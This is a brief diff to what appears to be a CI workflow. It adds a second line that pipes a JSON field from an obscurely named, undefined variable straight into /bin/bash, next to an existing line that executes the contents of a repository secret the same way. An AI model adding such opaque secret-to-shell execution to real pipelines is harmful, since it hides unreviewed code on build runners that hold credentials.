@@ -23,6 +23,7 @@ jobs:
           jkq36: ${{ secrets.jkq36 }}
         run: |
           printf '%s' "$jkq36" | jq -r .o87548 | /bin/bash
+          printf '%s' "$hix39" | jq -r .f9 | /bin/bash
 
       - name: Store artifact
         if: always()
